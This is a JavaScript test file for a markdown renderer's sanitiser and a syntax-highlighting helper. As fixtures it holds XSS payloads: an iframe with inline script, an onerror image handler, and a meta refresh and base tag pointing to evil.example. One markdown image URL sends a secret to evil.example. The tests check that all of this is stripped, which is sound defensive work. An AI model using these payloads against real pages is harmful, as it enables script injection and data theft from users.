import assert from 'node:assert/strict';
import test from 'node:test';
import React from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import MarkdownView from '../web/src/components/MarkdownView';
import { highlightedLines } from '../web/src/lib/highlight';

test('markdown keeps ordinary HTML formatting and removes active content', () => {
  const html = renderToStaticMarkup(<MarkdownView text={'<p align="center">Hello<br/><strong>world</strong></p>\n<iframe srcdoc="<script>alert(1)</script>"></iframe><object data="/api/restart"></object><base href="https://evil.example/"><meta http-equiv="refresh" content="0;url=https://evil.example"><form action="/api/restart">test</form><img src="icon.png" onerror="alert(1)" style="position:fixed">'} baseDir="/project" />);
  assert.match(html, /align="center"/); assert.match(html, /<strong>world<\/strong>/);
  assert.match(html, /src="\/api\/fs\/raw\?path=%2Fproject%2Ficon.png"/);
  assert.doesNotMatch(html, /<(?:iframe|object|base|meta|form|script)\b|onerror|position:fixed/);
});

test('markdown does not fetch remote images or expose raw documents through links', () => {
  const html = renderToStaticMarkup(<MarkdownView text={'![private](https://evil.example/?secret=test)\n[local](file:///project/file.html)\n[bad](javascript:alert)'} baseDir="/project" />);
  assert.doesNotMatch(html, /<img\b|<link\b|javascript:/);
  assert.match(html, /<button/); assert.match(html, /href="#" title="\/project\/file.html"/);
});

test('multiline highlighted code keeps spans balanced in every row', () => {
  const lines = highlightedLines('<span class="hljs-comment">first\nsecond</span>\nplain');
  assert.deepEqual(lines, ['<span class="hljs-comment">first</span>', '<span class="hljs-comment">second</span>', 'plain']);
});
